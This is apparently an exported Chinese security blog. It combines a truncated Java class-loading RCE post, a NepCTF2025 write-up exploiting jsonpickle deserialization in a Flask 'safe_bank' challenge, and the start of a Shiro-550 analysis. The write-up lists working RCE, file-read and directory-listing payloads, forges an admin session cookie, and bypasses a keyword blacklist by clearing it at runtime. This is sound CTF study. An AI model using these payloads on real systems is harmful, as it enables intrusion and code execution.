RCE的第二部分\n\n这里的话主要是利用类加载机制去反射构造RCE\n\nJVM拥有多种ClassLoader, 不同的 ClassLoader 会从不同的地方加载字节码文件, 加载方式可以通过不同的文件目录加载, 也可以从不同的 jar 文件加载，还包括使用网络服务地址来加载。几个重要的 ClassLoader : `BootstrapClassLoader`、`ExtensionClassLoader` 和`AppClassLoader`、`UrlClassLoader`\n\n### UrlClassLoader\n\nURLClassLoader 可以加载远程类库和本地路径的类库，调用思路 : 远程加载class文件，通过函数调用或者静态代码块来调用\n\n例如我们在自己本地上构造一个恶意类\n\n```java\nimport java.io.IOException;\n\npublic class POC {\n    static {\n        try {\n            Runtime.getRuntime().exec(\"calc\");\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```\n\n编译为class文件，然后我们在该目录下起一个http服务\n\n```python\npython -m http.server 8000\n```\n\n然后我们进行表达式注入\n\n```java\n```\n\n\n\n\n\n","tags":["Spring框架"],"categories":["javasec"]},{"title":"Nepctf2025 safe_bank深究","url":"/2025/08/04/Nepctf2025-safe-bank深究/","content":"\n## 前言\n\n至于为什么要写这篇文章呢？因为我认为这算是一个很高质量的题目，况且对于我对python并不熟悉来说，我们需要深入源码去分析才能做到更好的理解，所以打算单开一篇文章写这个题的思路和过程\n\n## 原来不是flag？\n\n```\n欢迎来到全世界最安全的银行系统！我们采用了最先进的安保系统来保护您的账户。但最近有传言说，即使是最安全的系统也可能存在漏洞。你能绕过我们的安全措施，进入金库获取宝藏吗？\n```\n\n打开题目是一个登录口，在/about下有提示\n\n![image-20250730145809452](../image/achieve/202411/NepCTF2025/image-20250730145809452.png)\n\n从这里可以得出几个信息，这里的话是python的flask框架开发的web应用，然后是用json进行数据传输的，在会话管理方面是用的jsonpickle去进行传输token的。\n\n话不多说，我们先注册个账号进去看一下\n\nadmin用户存在？我们换个1111/111111注册一下（要求用户名大于4位，密码大于6位）\n\n![image-20250730150038518](../image/achieve/202411/NepCTF2025/image-20250730150038518.png)\n\n提示需要管理员权限才能访问，那么就需要伪造admin身份了，直接看cookie的结构\n\n```python\nauthz=eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogIjExMTEiLCAidHMiOiAxNzUzODU4ODMyfX0=\n```\n\n之前提示是base64编码的，拿去解码一下\n\n![image-20250730150209535](../image/achieve/202411/NepCTF2025/image-20250730150209535.png)\n\n明了了，user就是我们刚刚注册的用户名，我们改成admin试一下，一开始以为需要注意后面的时间戳的，但是好像貌似不需要？\n\n![image-20250730150324904](../image/achieve/202411/NepCTF2025/image-20250730150324904.png)\n\n拿到管理员身份了，但是保险库中是一个假的flag。。。好吧，挖了个坑\n\n## 深究源码\n\n因为是提示了jsonpickle，所以去先知社区翻了一下文章\n\n[从源码看JsonPickle反序列化利用与绕WAF](https://xz.aliyun.com/news/16133)\n\n从里面可以看到jsonpickle的反序列化恢复对象其实是基于本身定义的一些标签去进行的。话不多说，直接拖一个源码下来分析一下\n\nhttps://github.com/jsonpickle/jsonpickle\n\n`jsonpickle/tags.py`文件下有反序列化支持的标签，标签对应的处理函数见`jsonpickle/unpickler.py`。\n\n```python\n#tags.py\n\"\"\"The jsonpickle.tags module provides the custom tags\nused for pickling and unpickling Python objects.\n\nThese tags are keys into the flattened dictionaries\ncreated by the Pickler class.  The Unpickler uses\nthese custom key names to identify dictionaries\nthat need to be specially handled.\n\"\"\"\n\nBYTES: str = 'py/bytes'\nB64: str = 'py/b64'\nB85: str = 'py/b85'\nFUNCTION: str = 'py/function'\nID: str = 'py/id'\nINITARGS: str = 'py/initargs'\nITERATOR: str = 'py/iterator'\nJSON_KEY: str = 'json://'\nMODULE: str = 'py/mod'\nNEWARGS: str = 'py/newargs'\nNEWARGSEX: str = 'py/newargsex'\nNEWOBJ: str = 'py/newobj'\nOBJECT: str = 'py/object'\nPROPERTY: str = 'py/property'\nREDUCE: str = 'py/reduce'\nREF: str = 'py/ref'\nREPR: str = 'py/repr'\nSEQ: str = 'py/seq'\nSET: str = 'py/set'\nSTATE: str = 'py/state'\nTUPLE: str = 'py/tuple'\nTYPE: str = 'py/type'\n\n# All reserved tag names\nRESERVED: set = {\n    BYTES,\n    FUNCTION,\n    ID,\n    INITARGS,\n    ITERATOR,\n    MODULE,\n    NEWARGS,\n    NEWARGSEX,\n    NEWOBJ,\n    OBJECT,\n    PROPERTY,\n    REDUCE,\n    REF,\n    REPR,\n    SEQ,\n    SET,\n    STATE,\n    TUPLE,\n    TYPE,\n}\n```\n\n反序列化的流程，先看decode函数\n\n```python\ndef decode(\n    string: str,\n    backend: Optional[JSONBackend] = None,\n    # we get a lot of errors when typing with TypeVar\n    context: Optional[\"Unpickler\"] = None,\n    keys: bool = False,\n    reset: bool = True,\n    safe: bool = True,\n    classes: Optional[ClassesType] = None,\n    v1_decode: bool = False,\n    on_missing: MissingHandler = 'ignore',\n    handle_readonly: bool = False,\n) -> Any:\n    if isinstance(on_missing, str):\n        on_missing = on_missing.lower()\n    elif not util._is_function(on_missing):\n        warnings.warn(\n            \"Unpickler.on_missing must be a string or a function! It will be ignored!\"\n        )\n\n    backend = backend or json\n    context = context or Unpickler(\n        keys=keys,\n        backend=backend,\n        safe=safe,\n        v1_decode=v1_decode,\n        on_missing=on_missing,\n        handle_readonly=handle_readonly,\n    )\n    data = backend.decode(string)\n    return context.restore(data, reset=reset, classes=classes)\n```\n\n解释一下几个重要参数：\n\n- string: 要解码的 JSON 字符串。\n\n- keys: 如果设置为True，则jsonpickle将解码非字符串类型的字典键\n- backend: 指定一个解码后端（`JSONBackend`）。如果未提供，默认为 `json`\n- safe:一个非常重要的安全开关。如果为 False，它会使用 eval() 来恢复某些旧格式的对象，这存在安全风险，可能被用来执行恶意代码。**默认为 True，即安全模式**。\n\n```python\ndata = backend.decode(string)\n```\n\n这里的话利用backend的decode方法先将传入的字符串进行解码\n\n```python\nreturn context.restore(data, reset=reset, classes=classes)\n```\n\n调用context的restore方法去将解码后的数据恢复成python对象。然后我们继续根据restore\n\n![image-20250730152512419](../image/achieve/202411/NepCTF2025/image-20250730152512419.png)\n\n继续跟进_restore\n\n![image-20250730152538424](../image/achieve/202411/NepCTF2025/image-20250730152538424.png)\n\n如果 `obj` 是字符串、列表、字典、集合或元组中的一种，程序会调用 `self._restore_tags(obj)`，继续跟进\n\n```python\n    def _restore_tags(\n        self, obj: Any, _passthrough: Callable[[Any], Any] = _passthrough\n    ) -> Callable[[Any], Any]:\n        \"\"\"Return the restoration function for the specified object\"\"\"\n        try:\n            if not tags.RESERVED <= set(obj) and type(obj) not in (list, dict):\n                return _passthrough\n        except TypeError:\n            pass\n        if type(obj) is dict:\n            if tags.TUPLE in obj:\n                restore = self._restore_tuple\n            elif tags.SET in obj:\n                restore = self._restore_set  # type: ignore[assignment]\n            elif tags.B64 in obj:\n                restore = self._restore_base64  # type: ignore[assignment]\n            elif tags.B85 in obj:\n                restore = self._restore_base85  # type: ignore[assignment]\n            elif tags.ID in obj:\n                restore = self._restore_id\n            elif tags.ITERATOR in obj:\n                restore = self._restore_iterator  # type: ignore[assignment]\n            elif tags.OBJECT in obj:\n                restore = self._restore_object\n            elif tags.TYPE in obj:\n                restore = self._restore_type\n            elif tags.REDUCE in obj:\n                restore = self._restore_reduce\n            elif tags.FUNCTION in obj:\n                restore = self._restore_function\n            elif tags.MODULE in obj:\n                restore = self._restore_module\n            elif tags.REPR in obj:\n                if self.safe:\n                    restore = self._restore_repr_safe\n                else:\n                    restore = self._restore_repr\n            else:\n                restore = self._restore_dict  # type: ignore[assignment]\n        elif type(obj) is list:\n            restore = self._restore_list  # type: ignore[assignment]\n        else:\n            restore = _passthrough  # type: ignore[assignment]\n        return restore\n```\n\n这里的话就是重要逻辑了， 根据标签去恢复对象，可以看到当对象为字典的时候逻辑还是蛮多的。我们找几个有意思的看一下\n\n### py/object\n\n先看看处理逻辑\n\n```python\n    def _restore_object(self, obj: Dict[str, Any]) -> Any:\n        class_name = obj[tags.OBJECT]\n        cls = loadclass(class_name, classes=self._classes)\n        handler = handlers.get(cls, handlers.get(class_name))  # type: ignore[arg-type]\n        if handler is not None:  # custom handler\n            proxy = _Proxy()\n            self._mkref(proxy)\n            instance = handler(self).restore(obj)\n            proxy.reset(instance)\n            self._swapref(proxy, instance)\n            return instance\n\n        if cls is None:\n            self._process_missing(class_name)\n            return self._mkref(obj)\n\n        return self._restore_object_instance(obj, cls, class_name)  # type: ignore[arg-type]\n```\n\n先是从处理对象中提取出py/object键的值作为class_name类名，我们跟进看一下这个loadclass方法\n\n```python\ndef loadclass(\n    module_and_name: str, classes: Optional[Dict[str, Type[Any]]] = None\n) -> Optional[Union[Type[Any], ModuleType]]:\n    \"\"\"Loads the module and returns the class.\n\n    >>> cls = loadclass('datetime.datetime')\n    >>> cls.__name__\n    'datetime'\n\n    >>> loadclass('does.not.exist')\n\n    >>> loadclass('builtins.int')()\n    0\n\n    \"\"\"\n    # Check if the class exists in a caller-provided scope\n    if classes:\n        try:\n            return classes[module_and_name]\n        except KeyError:\n            # maybe they didn't provide a fully qualified path\n            try:\n                return classes[module_and_name.rsplit('.', 1)[-1]]\n            except KeyError:\n                pass\n    # Otherwise, load classes from globally-accessible imports\n    names = module_and_name.split('.')\n    # First assume that everything up to the last dot is the module name,\n    # then try other splits to handle classes that are defined within\n    # classes\n    for up_to in range(len(names) - 1, 0, -1):\n        module = util.untranslate_module_name('.'.join(names[:up_to]))\n        try:\n            __import__(module)\n            obj = sys.modules[module]\n            for class_name in names[up_to:]:\n                obj = getattr(obj, class_name)\n            return obj\n        except (AttributeError, ImportError, ValueError):\n            continue\n    # NoneType is a special case and can not be imported/created\n    if module_and_name == \"builtins.NoneType\":\n        return type(None)\n    return None\n```\n\n其实就是一个加载指定模块中类的一个方法，先是检查classes字典是否存在，存在则把里面的str键对应的值返回，如果没找到的话就会分离出最后一部分类名并再次查找。例如，`'datetime.datetime'` 会先查找 `'datetime.datetime'`，如果找不到，再尝试查找 `'datetime'`。如果两者都没有找到，则跳过这部分逻辑。\n\n如果classes字典并不存在的话，就会通过从系统中动态加载模块去获取类，这里的话就没必要说了\n\n其实这里的话就是一个获取模块中类的过程，跟进一下return中的函数\n\n重点看几个逻辑\n\n```python\nif has_tag(obj, tags.NEWARGSEX):\n            args, kwargs = obj[tags.NEWARGSEX]\n        else:\n            args = getargs(obj, classes=self._classes)\n            kwargs = {}\n        if args:\n            args = self._restore(args)\n        if kwargs:\n            kwargs = self._restore(kwargs)\n```\n\n如果obj字典中包含tags.NEWARGSEX标签，就会从该标签中获取`args` 和 `kwargs`，这两个变量分别表示的是位置参数和关键字参数\n\n如果没有这个标签的话会调用getargs方法去获取参数，并设置关键字参数为空\n\n如果这两个变量存在，就会调用_restore去反序列化，恢复它们的原始数据结构。\n\n```python\n        try:\n            if not is_oldstyle and hasattr(cls, '__new__'):\n                # new style classes\n                if factory:\n                    instance = cls.__new__(cls, factory, *args, **kwargs)\n                    instance.default_factory = factory\n                else:\n                    instance = cls.__new__(cls, *args, **kwargs)\n            else:\n                instance = object.__new__(cls)\n        except TypeError:  # old-style classes\n            is_oldstyle = True\n```\n\n如果是新式类且该类定义了 `__new__` 方法，使用 `cls.__new__` 来实例化对象。如果有工厂方法，则将工厂方法作为参数传递给 `__new__`。\n\n如果不是新式类的话就自动实例一个空对象\n\n```python\n        if is_oldstyle:\n            try:\n                instance = cls(*args)\n            except TypeError:  # fail gracefully\n                try:\n                    instance = make_blank_classic(cls)\n                except Exception:  # fail gracefully\n                    self._process_missing(class_name)\n                    return self._mkref(obj)\n```\n\n如果是旧式类，就直接利用`cls(*args)`调用构造函数，并且这里会触发`__init__`方法\n\n这里的话还会恢复实例中的变量，也就是从obj中提取数据并赋值给实例的各个属性变量\n\n最终返回恢复出来的实例。\n\n我们写个demo测试一下\n\n```python\nimport jsonpickle\nimport json\n\npayload = {\n    \"py/object\" : \"glob.glob\",\n    \"py/newargs\" : [\"/\"]\n}\ndata = json.dumps(payload)\nraw = jsonpickle.decode(data)\n\n```\n\n![image-20250730160910265](../image/achieve/202411/NepCTF2025/image-20250730160910265.png)\n\n在`_restore_object`中打断点进入\n\n![image-20250804105304724](../image/achieve/202411/NepCTF2025/image-20250804105304724.png)\n\n可以看到在执行了loadclass之后成功找到glob方法并赋值给cls，步入return语句，这里的话会先判断是否有newargsex标签，我们这里没用上，所以到else中获取到arg的值，随后进入_restore方法\n\n![image-20250804110503048](../image/achieve/202411/NepCTF2025/image-20250804110503048.png)\n\n这里的话就是再次调用`_restore_tags`去获取args了，因为这里的话args是一个列表，所以会进入最后一个list的语句调用`_restore_list`\n\n![image-20250804111243251](../image/achieve/202411/NepCTF2025/image-20250804111243251.png)\n\n往后走，最终的话就是会调用`glob,glob(\"/*\")`\n\n不小心把代码写错了，应该是这样的\n\n```python\nimport jsonpickle\nimport json\npayload = {\n    \"py/object\" : \"glob.glob\",\n    \"py/newargs\" : [\"/*\"]\n}\ndata = json.dumps(payload)\nraw = jsonpickle.decode(data)\nprint(raw)\n\n```\n\n然后我们具体看一下那两个参数标签\n\n### py/newargs和py/newargsex\n\n<img src=\"../image/achieve/202411/NepCTF2025/image-20250804112907139.png\" alt=\"image-20250804112907139\" style=\"zoom:150%;\" />\n\npy/newargsex反序列化处理逻辑\n\n![image-20250804113004421](../image/achieve/202411/NepCTF2025/image-20250804113004421.png)\n\npy/newargs反序列化处理逻辑\n\n![image-20250804113200615](../image/achieve/202411/NepCTF2025/image-20250804113200615.png)\n\n把刚刚的代码换成py/newargsex跑一下\n\n![image-20250804114414571](../image/achieve/202411/NepCTF2025/image-20250804114414571.png)\n\n出现了一个报错，其实就是因为我们传入的内容格式不正确导致的，由于`py/newargsex` 的值应该是一个包含两个元素的列表：`[args, kwargs]`，所以需要改成\n\n```python\nimport jsonpickle\nimport json\npayload = {\n    \"py/object\" : \"glob.glob\",\n    \"py/newargsex\" : [[\"/*\"], {}]\n}\ndata = json.dumps(payload)\nraw = jsonpickle.decode(data)\nprint(raw)\n\n```\n\n### payload总结\n\n- 读目录\n\n```python\nglob.glob函数\n{\"py/object\" : \"glob.glob\", \"py/newargs\" : [\"/*\"]}\n{\"py/object\" : \"glob.glob\", \"py/newargsex\" : [[\"/*\"], {}]}\n \nos.listdir函数\n{\"py/object\" : \"os.listdir\",\"py/newargs\" : [\"/\"]}\n{\"py/object\" : \"os.listdir\",\"py/newargsex\" : [[\"/\"], {}]}\n```\n\n- 读文件\n\n```python\nlinecache.getlines函数\n{\"py/object\" : \"subprocess.getoutput\",\"py/newargs\" : [\"calc\"]}\n{\"py/object\" : \"linecache.getlines\",\"py/newargsex\" : [[\"test.py\"], {}]}\n```\n\n- RCE\n\n```python\n{\"py/object\" : \"subprocess.run\",\"py/newargs\" : [\"calc\"]}\n\n{\"py/object\" : \"subprocess.getoutput\",\"py/newargs\" : [\"calc\"]}\n\n{\"py/object\" : \"pickle.loads\", \"py/newargs\": [{\"py/b64\":\"KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJjYWxjIicKby4=\"}]}\n\n{\"py/object\": \"timeit.main\", \"py/newargs\": [[\"-r\", \"1\", \"-n\", \"1\", \"__import__('os').system('calc')\"]]}\n\n{\"py/object\": 'uuid._get_command_stdout', 'py/newargs': ['calc']}\n\n{'py/object': 'pydoc.pipepager', 'py/newargs': ['a', 'calc']}\n```\n\n然后我们可以试一下\n\n## 初次尝试\n\n在尝试之前，我们需要注意一个点，就是关于回显位的问题，我们如何将反序列化后的执行结果返回到页面中进行渲染？\n\n先把之前的cookie拿过来看一下\n\n```html\n{\"py/object\": \"__main__.Session\", \"meta\": {\"user\": \"1111\", \"ts\": 1754290309}}\n```\n\n再结合/panel路由的页面\n\n<img src=\"../image/achieve/202411/NepCTF2025/image-20250804145550776.png\" alt=\"image-20250804145550776\" style=\"zoom:150%;\" />\n\n不难看出，user中的内容就是会回显到页面中，那我们不妨把poc翻到user的值中\n\n```python\nimport base64\nimport json\nimport time\npayload = {\n    \"py/object\": \"__main__.Session\",\n    \"meta\": {\n        \"user\": {\"py/object\" : \"glob.glob\", \"py/newargs\" : [\"/*\"]},\n        \"ts\": int(time.time()),\n    }\n}\njson_payload = json.dumps(payload)\ndata = base64.b64encode(json_payload.encode('utf-8')).decode('utf-8')\nprint(data)\n\n```\n\n![image-20250804145721516](../image/achieve/202411/NepCTF2025/image-20250804145721516.png)\n\n成功回显了根目录下的文件，证明我们的思路是正确的\n\n有一个flag和readflag文件，先尝试读一下flag\n\n```python\npayload = {\n    \"py/object\": \"__main__.Session\",\n    \"meta\": {\n        \"user\": {\"py/object\" : \"linecache.getlines\",\"py/newargs\" : [\"/flag\"]},\n        \"ts\": int(time.time()),\n    }\n}\n```\n\n但是没有返回内容，估计是有权限，那么就想到需要RCE去执行readflag了\n\n## 厚积薄发\n\n先读一下源码/app/app.py，拿到后有点乱，丢给ai处理一下\n\n```python\nfrom flask import Flask, request, make_response, render_template, redirect, url_for\nimport jsonpickle\nimport base64\nimport json\nimport os\nimport time\n\napp = Flask(__name__)\napp.secret_key = os.urandom(24)\n\nclass Account:\n    def __init__(self, uid, pwd):\n        self.uid = uid\n        self.pwd = pwd\n\nclass Session:\n    def __init__(self, meta):\n        self.meta = meta\n\nusers_db = [\n    Account(\"admin\", os.urandom(16).hex()),\n    Account(\"guest\", \"guest\")\n]\n\ndef register_user(username, password):\n    for acc in users_db:\n        if acc.uid == username:\n            return False\n    users_db.append(Account(username, password))\n    return True\n\nFORBIDDEN = [\n    'builtins', 'os', 'system', 'repr', '__class__', 'subprocess', 'popen', 'Popen', 'nt',\n    'code', 'reduce', 'compile', 'command', 'pty', 'platform', 'pdb', 'pickle', 'marshal',\n    'socket', 'threading', 'multiprocessing', 'signal', 'traceback', 'inspect', '\\\\\\\\', 'posix',\n    'render_template', 'jsonpickle', 'cgi', 'execfile', 'importlib', 'sys', 'shutil', 'state',\n    'import', 'ctypes', 'timeit', 'input', 'open', 'codecs', 'base64', 'jinja2', 're', 'json',\n    'file', 'write', 'read', 'globals', 'locals', 'getattr', 'setattr', 'delattr', 'uuid',\n    '__import__', '__globals__', '__code__', '__closure__', '__func__', '__self__', 'pydoc',\n    '__module__', '__dict__', '__mro__', '__subclasses__', '__init__', '__new__'\n]\n\ndef waf(serialized):\n    try:\n        data = json.loads(serialized)\n        payload = json.dumps(data, ensure_ascii=False)\n        for bad in FORBIDDEN:\n            if bad in payload:\n                return bad\n        return None\n    except:\n        return \"error\"\n\n@app.route('/')\ndef root():\n    return render_template('index.html')\n\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        password = request.form.get('password')\n        confirm_password = request.form.get('confirm_password')\n        \n        if not username or not password or not confirm_password:\n            return render_template('register.html', error=\"所有字段都是必填的。\")\n        \n        if password != confirm_password:\n            return render_template('register.html', error=\"密码不匹配。\")\n        \n        if len(username) < 4 or len(password) < 6:\n            return render_template('register.html', error=\"用户名至少需要4个字符，密码至少需要6个字符。\")\n        \n        if register_user(username, password):\n            return render_template('index.html', message=\"注册成功！请登录。\")\n        else:\n            return render_template('register.html', error=\"用户名已存在。\")\n        \n    return render_template('register.html')\n\n@app.post('/auth')\ndef auth():\n    u = request.form.get(\"u\")\n    p = request.form.get(\"p\")\n    for acc in users_db:\n        if acc.uid == u and acc.pwd == p:\n            sess_data = Session({'user': u, 'ts': int(time.time())})\n            token_raw = jsonpickle.encode(sess_data)\n            b64_token = base64.b64encode(token_raw.encode()).decode()\n            resp = make_response(\"登录成功。\")\n            resp.set_cookie(\"authz\", b64_token)\n            resp.status_code = 302\n            resp.headers['Location'] = '/panel'\n            return resp\n    return render_template('index.html', error=\"登录失败。用户名或密码无效。\")\n\n@app.route('/panel')\ndef panel():\n    token = request.cookies.get(\"authz\")\n    if not token:\n        return redirect(url_for('root', error=\"缺少Token。\"))\n    \n    try:\n        decoded = base64.b64decode(token.encode()).decode()\n    except:\n        return render_template('error.html', error=\"Token格式错误。\")\n    \n    ban = waf(decoded)\n    if waf(decoded):\n        return render_template('error.html', error=f\"请不要黑客攻击！{ban}\")\n    \n    try:\n        sess_obj = jsonpickle.decode(decoded, safe=True)\n        meta = sess_obj.meta\n        \n        if meta.get(\"user\") != \"admin\":\n            return render_template('user_panel.html', username=meta.get('user'))\n        \n        return render_template('admin_panel.html')\n    except Exception as e:\n        return render_template('error.html', error=f\"数据解码失败。\")\n\n@app.route('/vault')\ndef vault():\n    token = request.cookies.get(\"authz\")\n    if not token:\n        return redirect(url_for('root'))\n\n    try:\n        decoded = base64.b64decode(token.encode()).decode()\n        if waf(decoded):\n            return render_template('error.html', error=\"请不要尝试黑客攻击！\")\n        sess_obj = jsonpickle.decode(decoded, safe=True)\n        meta = sess_obj.meta\n        \n        if meta.get(\"user\") != \"admin\":\n            return render_template('error.html', error=\"访问被拒绝。只有管理员才能查看此页面。\")\n        \n        flag = \"NepCTF{fake_flag_this_is_not_the_real_one}\"\n        \n        return render_template('vault.html', flag=flag)\n    except:\n        return redirect(url_for('root'))\n\n@app.route('/about')\ndef about():\n    return render_template('about.html')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000, debug=False)\n```\n\n当看到黑名单的时候心就已经凉了一半\n\n```python\nFORBIDDEN = [\n    'builtins', 'os', 'system', 'repr', '__class__', 'subprocess', 'popen', 'Popen', 'nt',\n    'code', 'reduce', 'compile', 'command', 'pty', 'platform', 'pdb', 'pickle', 'marshal',\n    'socket', 'threading', 'multiprocessing', 'signal', 'traceback', 'inspect', '\\\\\\\\\\\\\\\\', 'posix',\n    'render_template', 'jsonpickle', 'cgi', 'execfile', 'importlib', 'sys', 'shutil', 'state',\n    'import', 'ctypes', 'timeit', 'input', 'open', 'codecs', 'base64', 'jinja2', 're', 'json',\n    'file', 'write', 'read', 'globals', 'locals', 'getattr', 'setattr', 'delattr', 'uuid',\n    '__import__', '__globals__', '__code__', '__closure__', '__func__', '__self__', 'pydoc',\n    '__module__', '__dict__', '__mro__', '__subclasses__', '__init__', '__new__'\n]\n```\n\n### 方法一：清理黑名单\n\n这个方法来自LAMENTXU师傅的文章https://www.cnblogs.com/LAMENTXU/articles/19007988\n\n具体是什么样的呢？\n\n用到一个内置函数list.clear()\n\n![image-20250804151456191](../image/achieve/202411/NepCTF2025/image-20250804151456191.png)\n\n\n\n我们本地测试一下\n\n![image-20250804151555886](../image/achieve/202411/NepCTF2025/image-20250804151555886.png)\n\n因为这里的黑名单也是list类型，那我们是否可以调用FORBIDDEN.clear()去清空黑名单呢？\n\n写个poc\n\n```python\npayload = {\n    \"py/object\": \"__main__.Session\",\n    \"meta\": {\n        \"user\": {\"py/object\" : \"__main__.FORBIDDEN.clear\",\"py/newargs\" : []},\n        \"ts\": int(time.time()),\n    }\n}\n```\n\n![image-20250804151833193](../image/achieve/202411/NepCTF2025/image-20250804151833193.png)\n\n返回none，那我们检验一下是否被置空了\n\n```python\n{\"py/object\" : \"subprocess.run\",\"py/newargs\" : [\"whoami\"]}\n```\n\n![image-20250804155407712](../image/achieve/202411/NepCTF2025/image-20250804155407712.png)\n\n这里的话因为run函数执行之后是返回一个对象，所以没有回显，但是返回0是说明执行成功了，那我们尝试换成subprocess.getoutput\n\n```python\n{\"py/object\" : \"subprocess.getoutput\",\"py/newargs\" : [\"whoami\"]}\n```\n\n![image-20250804160243842](../image/achieve/202411/NepCTF2025/image-20250804160243842.png)\n\n成功回显，那我们RCE执行/readflag就行了\n\n![image-20250804160337646](../image/achieve/202411/NepCTF2025/image-20250804160337646.png)\n\n### 方法二：map类触发\n\n`map()`函数的基本语法如下：\n\n```\nmap(function, iterable, ...)\n```\n\n- `function`: 一个函数，用于对每个可迭代对象的元素执行操作。\n- `iterable`: 一个或多个可迭代对象，可以是列表、元组、集合等。\n  所以map的参数需要用`[]`或者`{}`包裹\n\n但是map中的函数触发是需要被类用才能触发，比如bytes，list类接受迭代器参数初始化的时候\n\n我们写个demo测试一下\n\n```python\nimport os  \nimport builtins  \n\nresult = (map(os.system, 'echo 111'))  \nresult1= bytes(map(os.system, ['echo 123']))\n```\n\n这里只返回了123，说明bytes类能触发map的函数调用\n\n**bytes在new的时候会触发map的实例化**，比如这样就可以触发rce,\n\n所以最终的poc\n\n```python\n    payload = {\n        \"py/object\": \"app.Session\",\n        \"meta\": {\n            \"user\": {\n                \"py/object\": \"__builtin__.bytes\",\n                \"py/newargs\": {\n                    \"py/object\": \"__builtin__.map\",\n                    \"py/newargs\": [\n                        {\"py/function\": \"__builtin__.eval\"},\n                        [f\"exec({chr_command})\"],\n                    ],\n                },\n            },\n            \"ts\": int(time.time()),\n        },\n    }\n```\n\n","tags":["NepCTF2025"],"categories":["赛题wp"]},{"title":"Shiro反序列化","url":"/2025/07/31/Java反序列化之Shiro反序列化/","content":"\n**Apache Shiro** 是一个强大且灵活的 **Java 安全框架**，用于处理 **身份认证、授权、密码加密、会话管理** 等功能。\n\n在分析Shiro反序列化的过程中，我会更偏向于对项目源码的解读，也是借此机会学一下这个框架的一些基础逻辑\n\nShiro反序列化主要分为shiro550和shiro721\n\n在shiro版本小于1.2.5时，被称作`shiro-550`，shiro反序列化的产生原因主要是因为**rememberMe**内容，原因是AES密钥被硬编码在shiro源码中，导致在cookie中的rememberMe可以被插入恶意代码造成代码执行。在1.2.5之后，shiro使用了随机密钥，又因为**padding oracle attack**导致反序列化，被称作`shiro-721`。\n\n参考文章：\n\n[Shiro反序列化](https://infernity.top/2025/02/26/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)\n\n[深入探究Shiro反序列化漏洞](https://www.freebuf.com/articles/web/395728.html)\n\n## 环境搭建\n\njdk版本这里是1.8.0_65\n\n1、从github中下载shiro1.2.4\n\nhttps://codeload.github.com/apache/shiro/zip/refs/tags/shiro-root-1.2.4\n\n解压后用IDEA打开，并修改pom.xml的内容，把`jstl依赖`版本改为`1.2`，没有的话自己加一个\n\n` Shiro 1.2.4 的内部依赖或运行机制与 JSTL 的 1.2 版本兼容性最好`\n\n```xml\n            <dependency>\n                <groupId>javax.servlet</groupId>\n                <artifactId>jstl</artifactId>\n                <version>1.2</version>\n                <scope>runtime</scope>\n            </dependency>\n```\n\n但是这里的话源码一直下不下来，得配置maven代理，或者换maven的版本为3.8.1之前的。从 **Maven 3.8.1** 开始，默认禁止了通过不安全的 http:// 仓库下载依赖。\n\n然后需要配置一个tomcat服务器，具体配置的话看https://blog.csdn.net/qq_36389060/article/details/114895961或者https://blog.csdn.net/m0_48170265/article/details/129073985\n\n我这里是jdk1.8的，所以需要将pom中的版本换一下\n\n```xml\n<jdk.version>1.8</jdk.version>\n```\n\n2、安装配置Tomcat服务器\n\nTomcat下载官网：https://tomcat.apache.org/，按着第二个链接安装一下，\n\nDOS窗口输入`startup.bat`回车后访问8080端口看看是否安装成功\n\n![image-20250731163646275](../image/achieve/202411/java学习/image-20250731163646275.png)\n\n这样的话就算成功了\n\n然后我们配置tomcat服务器\n\n![image-20250731164058166](../image/achieve/202411/java学习/image-20250731164058166.png)\n\n编辑配置的时候让我们的项目用tomcat去运行\n\n![image-20250731164721240](../image/achieve/202411/java学习/image-20250731164721240.png)\n\n部署的工件选samples-web:war\n\n![image-20250731164045385](../image/achieve/202411/java学习/image-20250731164045385.png)\n\n配置好后启动服务器\n\n![image-20250731165734505](../image/achieve/202411/java学习/image-20250731165734505.png)\n\n到此环境就算搭建好了\n\n## Shiro550\n\n### 影响版本\n\nshiro <= 1.2.4\n\n### 特征判断\n\n响应包中包含字段remember=deleteMe字段\n\n### 漏洞介绍\n\n在shiro版本小于1.2.5时，被称作`shiro-550`。**shiro-550主要是由shiro的rememberMe内容反序列化导致的命令执行漏洞**，造成的原因是默认加密密钥是硬编码在shiro源码中，任何有权访问源代码的人都可以知道默认加密密钥。 于是攻击者可以创建一个恶意对象，对其进行序列化、编码，然后将其作为cookie的rememberMe字段内容发送，Shiro 将对其解码和反序列化，导致服务器运行一些恶意代码。\n\n### shiro登录逻辑分析\n\n换成调试模式运行服务器，访问login.jsp来到登录界面\n\n![image-20250731165941905](../image/achieve/202411/java学习/image-20250731165941905.png)\n\n尝试登录一下，记得选上Remember Me选项\n\n我们先找一下登录逻辑处理，先看看src/main/webapp/WEB-INF/web.xml，`web.xml` 文件是 **Java Web 项目的部署描述文件**\n\n看看里面关于配置shiro的核心过滤器\n\n```xml\n<filter>\n    <filter-name>ShiroFilter</filter-name>\n    <filter-class>org.apache.shiro.web.servlet.ShiroFilter</filter-class>\n</filter>\n\n<filter-mapping>\n    <filter-name>ShiroFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n\n```\n\n这里定义了一个ShiroFilter过滤器，并且使用的是自带的ShiroFilter类，`url-pattern=\"/*\"` 表示该过滤器拦截 **所有请求**\n\n然后我们看一下shiro.ini文件，这里定义了Shiro的登录逻辑，权限规则，拦截路径\n\n![image-20250731184646815](../image/achieve/202411/java学习/image-20250731184646815.png)\n\n- 设置全局登录页面为login.jsp，当用户访问需要认证的资源但未登录的时候会重定向到该页面\n- `/login.jsp = authc`使用authc过滤器处理登录请求\n\n`authc` 是 Apache Shiro 中的一个 